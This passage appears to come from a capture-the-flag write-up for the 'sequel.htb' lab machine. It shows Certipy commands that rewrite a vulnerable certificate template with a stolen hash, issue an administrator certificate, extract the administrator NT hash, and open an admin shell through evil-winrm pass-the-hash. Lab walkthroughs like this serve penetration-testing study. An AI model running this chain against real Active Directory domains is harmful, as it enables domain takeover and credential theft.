+<div class="code-box"><pre><code>└─$ certipy-ad  template -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.27.62 -template <u>DunderMifflinAuthentication</u> -target dc01.sequel.htb -save-old
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Saved old configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
+[*] Updating certificate template 'DunderMifflinAuthentication'
+[*] Successfully updated 'DunderMifflinAuthentication'</code></pre></div>
+
+<p class="text">Now we can request creation for this vulnerable certification.</p>
+<div class="code-box"><pre><code>└─$ certipy-ad req -ca sequel-DC01-CA -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.27.62 -template DunderMifflinAuthentication -target dc01.sequel.htb -upn administrator@sequel.htb -debug
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[+] Trying to resolve 'dc01.sequel.htb' at '10.129.27.62'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:10.129.27.62[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.129.27.62[\pipe\cert]
+[*] Successfully requested certificate
+[*] Request ID is 8
+[*] Got certificate with UPN 'administrator@sequel.htb'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'</code></pre></div>
+
+
+
+<p class="text">Using this generated pfx file, we can request NTLM hash of administrator.</p>
+<div class="code-box"><pre><code>└─$ certipy-ad auth -pfx administrator.pfx 
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@sequel.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:<u>7a8d4e04986afa8ed4060f75e5a0b3ff</u></code></pre></div>
+
+<p class="text">We can get admin PowerShell using PTH.</p>
+<div class="code-box"><pre><code>└─$ evil-winrm -i 10.129.27.62 -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents></code></pre></div>
+
+
+</body>
+</html>
